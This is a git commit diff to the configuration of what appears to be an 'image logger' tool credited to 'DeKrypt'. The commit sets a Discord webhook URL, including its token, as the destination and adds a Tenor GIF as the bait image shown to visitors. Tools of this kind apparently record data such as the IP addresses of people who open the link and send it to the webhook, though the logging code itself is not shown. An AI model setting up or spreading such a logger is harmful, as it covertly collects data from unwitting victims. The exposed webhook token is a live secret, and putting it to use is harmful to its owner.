be1070346a823417b686fc9b1c264715b8857210
Fulex-art <elify8735@gmail.com>
2025-11-28 22:31:29 +0300

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1444046720710348852/kZuKpP6GTQ7uIYmVDZs6HIIGZT49IB3-uxmH8As8l2HhNjZvyYnQboCCZS9BJDDsZHro",
+    "image": "https://tenor.com/view/testo-taylan-gif-14896210763585223681", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
